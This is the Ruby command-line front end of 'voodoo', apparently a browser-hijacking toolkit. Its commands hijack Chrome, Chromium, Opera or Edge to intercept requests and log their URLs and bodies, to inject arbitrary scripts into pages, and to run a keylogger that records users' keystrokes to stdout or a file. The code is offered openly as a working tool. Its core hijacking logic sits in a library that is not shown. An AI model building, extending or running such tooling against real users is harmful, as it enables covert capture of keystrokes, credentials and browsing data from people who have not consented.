require 'thor'
require 'json'
require 'voodoo/browser'

module VOODOO

    VERSION = 'v0.0.1'

    class CLI < Thor

        desc 'version', 'Prints voodoo version'
        def version
            puts VERSION
        end
        
        option :url_include, :type => :string, :aliases => :ui, :default => nil
        option :body_include, :type => :string, :aliases => :bi, :default => nil
        option :header_exists, :type => :string, :aliases => :he, :default => nil
        option :output, :type => :string, :aliases => :o, :default => 'stdout'
        option :site, :type => :string, :aliases => :s, :default => ''
        option :matches, :type => :array, :aliases => :m, :default => ['<all_urls>']
        option :browser, :type => :string, :aliases => :b, :default => 'chrome'
        desc 'intercept', 'intercept browser requests'
        def intercept
            browser = get_browser options[:browser]
            
            output = options[:output]

            if output != 'stdout'
                output = open(output, 'a')
            end

            browser.intercept(matches: options[:matches],
                              url_include: options[:url_include],
                              body_include: options[:body_include]) do |req|
                if output != 'stdout'
                    output.puts JSON.generate(req)
                    output.close
                    output = open(output, 'a')
                else
                    puts "#{req[:method]} #{req[:url]}"
                    if req[:body]
                        body = req[:body]
                        if body.length > 100
                            body = body[0...97] + '...'
                        end
                        puts "BODY: #{body}"
                    end
                end
            end

            browser.hijack options[:site]
        end

        option :site, :type => :string, :aliases => :s, :default => ''
        option :matches, :type => :array, :aliases => :m, :default => ['*://*/*']
        option :browser, :type => :string, :aliases => :b, :default => 'chrome'
        desc 'script <js/path>', 'add a content script'
        def script(path_or_js)
            browser = get_browser options[:browser]
            if File.exists? path_or_js
                browser.add_script file: path_or_js
            else
                browser.add_script content: path_or_js
            end
            browser.hijack options[:site]
        end
        
        option :site, :type => :string, :aliases => :s, :default => ''
        option :output, :type => :string, :aliases => :o, :default => 'stdout'
        option :matches, :type => :array, :aliases => :m, :default => ['*://*/*']
        option :browser, :type => :string, :aliases => :b, :default => 'chrome'
        desc 'keylogger', 'records user keystrokes'
        def keylogger
            browser = get_browser options[:browser]
            output = options[:output]

            if output != 'stdout'
                output = open(output, 'a')
            end

            browser.keylogger(matches: options[:matches]) do |event|
                if output != 'stdout'
                    output.puts JSON.generate(event)
                else
                    puts event[:log]
                end
            end

            browser.hijack options[:site]
        end

        def self.exit_on_failure?
            true
        end

        private

        def get_browser(name)
            browser = nil
            
            case name.downcase
                when 'chrome'
                    browser = Browser.Chrome
                when 'chromium'
                    browser = Browser.Chromium
                when 'opera'
                    browser = Browser.Opera
                when 'edge'
                    browser = Browser.Edge
            end

            if browser == nil
                raise StandardError.new "Unsupported browser \"#{name}\""
            end

            return browser
        end

    end

end